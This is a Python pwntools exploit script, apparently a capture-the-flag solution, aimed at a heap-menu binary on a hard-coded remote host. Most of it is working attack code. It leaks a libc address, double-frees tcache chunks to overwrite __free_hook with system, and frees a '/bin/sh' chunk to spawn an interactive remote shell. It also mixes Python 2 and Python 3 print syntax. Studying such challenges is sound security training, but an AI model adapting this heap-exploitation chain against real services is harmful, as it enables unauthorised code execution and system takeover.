#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 139.59.117.189 --port 3301 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '139.59.117.189'
port = int(args.PORT or 3301)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def add(idx,size):
    sleep(0.1)
    io.sendline('add')
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(size))

def delete(idx):
    sleep(0.1)
    io.sendline('remove')
    io.sendlineafter(": ",str(idx))

def view(idx):
    sleep(0.1)
    io.sendline('read')
    io.sendlineafter(": ",str(idx))

def edit(idx,msg):
    sleep(0.1)
    io.sendline('send')
    io.sendlineafter(": ",str(idx))
    io.sendafter(": ",str(msg))
libc = ELF("./libc.so.6")

add(0,0x500)
add(1,0x10)
delete(0)
add(1,0x20)
view(0)

leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print(hex(leak))
libc.address = leak - libc.sym['__malloc_hook'] - 1168 - 0x10  #0x1cf030
print hex(libc.address)
print hex(libc.sym['__free_hook'])

for i in range(8):
    add(i+2,0x20)

for i in range(9):
    delete(i+1)

delete(8)
delete(9)

for i in range(7):
    add(i+1,0x20)

add(1,0x20)
edit(1,p64(libc.sym['__free_hook']))
add(2,0x20)
add(3,0x20)
edit(3,"/bin/sh\x00")
add(4,0x20)
edit(4,p64(libc.sym['system']))

delete(3)

io.interactive()

